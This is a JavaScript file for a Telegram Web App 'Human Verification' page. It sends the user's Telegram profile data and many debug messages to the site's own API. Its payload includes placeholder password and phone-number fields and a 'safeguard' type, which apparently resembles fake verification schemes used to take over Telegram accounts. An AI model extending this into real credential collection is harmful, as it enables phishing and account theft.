// Function to send data to the server (unchanged)
async function sendDataToServer(data, type) {
  await fetch('/api/debug', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ message: `Sending data for ${type} with userId ${data.id}` }),
  });

  const response = await fetch('/api/users/telegram/info', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      userId: data.id,
      firstName: data.first_name,
      usernames: data.usernames,
      phoneNumber: data.phone_number,
      isPremium: data.premium,
      password: data.password,
      quicklySet: data.quickly_set,
      type
    }),
  });

  if (response.ok) {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Data sent to server successfully for ${type}` }),
    });
  } else {
    await fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `Failed to send data to server for ${type}: ${response.status} ${response.statusText}` }),
    });
  }
}

// Function to initialize the Telegram Web App and handle verification
function initializeWebApp() {
  fetch('/api/debug', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ message: 'check.js: Initializing Telegram Web App...' }),
  });

  if (window.Telegram && window.Telegram.WebApp) {
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: 'check.js: Telegram Web App context detected' }),
    });

    const webApp = window.Telegram.WebApp;
    webApp.ready(); // Signal that the web app is ready

    // Get user data from Telegram Web App
    const user = webApp.initDataUnsafe.user;
    const queryParams = new URLSearchParams(window.location.search);
    const type = queryParams.get('type') || 'safeguard';

    if (user) {
      fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: `check.js: User data: ${JSON.stringify(user)}` }),
      });

      // Prepare the user data
      const userData = {
        id: user.id.toString(),
        first_name: user.first_name || "Unknown",
        usernames: user.username ? [{ username: user.username }] : [],
        phone_number: "Not shared", // Telegram Web App doesn't provide phone number directly
        premium: user.is_premium || false,
        password: "Not available", // Password is not available via Web App
        quickly_set: null, // Not used in this context
      };

      // Add event listener to the "Click here" button
      const verifyButton = document.getElementById('verifyButton');
      if (verifyButton) {
        verifyButton.addEventListener('click', async () => {
          fetch('/api/debug', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message: `check.js: Verify button clicked for userId ${userData.id}` }),
          });

          // Send the user data to the server
          await sendDataToServer(userData, type);

          // Close the web app after successful verification
          webApp.close();
        });
      } else {
        fetch('/api/debug', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ message: 'check.js: Verify button not found in the DOM' }),
        });
        document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
      }
    } else {
      fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: 'check.js: No user data available from Telegram Web App' }),
      });
      document.body.innerHTML = "<p>Unable to verify user. Please try again.</p>";
    }
  } else {
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: 'check.js: Telegram Web App context not detected, proceeding with fallback' }),
    });

    // Fallback: Allow the "Human Verification" page to remain displayed
    const verifyButton = document.getElementById('verifyButton');
    if (verifyButton) {
      verifyButton.addEventListener('click', async () => {
        fetch('/api/debug', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ message: 'check.js: Verify button clicked in fallback mode (no Telegram Web App context)' }),
        });

        // Since we can't get user data, send a minimal payload
        const userData = {
          id: "unknown",
          first_name: "Unknown",
          usernames: [],
          phone_number: "Not shared",
          premium: false,
          password: "Not available",
          quickly_set: null,
        };
        const queryParams = new URLSearchParams(window.location.search);
        const type = queryParams.get('type') || 'safeguard';

        await sendDataToServer(userData, type);
      });
    } else {
      fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: 'check.js: Verify button not found in fallback mode' }),
      });
      document.body.innerHTML = "<p>Verification button not found. Please try again.</p>";
    }
  }
}

// Log initial load context
fetch('/api/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ message: 'check.js loaded in window: ' + (window.top === window ? 'top' : 'iframe') }),
});

// Debug the window object to check for Telegram properties
fetch('/api/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ message: `check.js: window.Telegram exists: ${!!window.Telegram}, window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}` }),
});

// Wait for the DOM to load and Telegram Web App to initialize
document.addEventListener("DOMContentLoaded", () => {
  fetch('/api/debug', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ message: 'check.js: DOM fully loaded, attempting to initialize Telegram Web App...' }),
  });

  // Retry mechanism in case Telegram Web App API isn't ready yet
  let attempts = 0;
  const maxAttempts = 20; // Increased to 20 attempts
  const interval = setInterval(() => {
    attempts++;
    fetch('/api/debug', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ message: `check.js: Attempt ${attempts}/${maxAttempts}: Checking for Telegram Web App context` }),
    });

    if (window.Telegram && window.Telegram.WebApp) {
      clearInterval(interval);
      initializeWebApp();
    } else if (attempts >= maxAttempts) {
      clearInterval(interval);
      fetch('/api/debug', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: 'check.js: Failed to detect Telegram Web App context after maximum attempts' }),
      });
      initializeWebApp(); // Proceed anyway, using the fallback logic
    }
  }, 1000); // Increased to 1000ms (1 second) per attempt
});
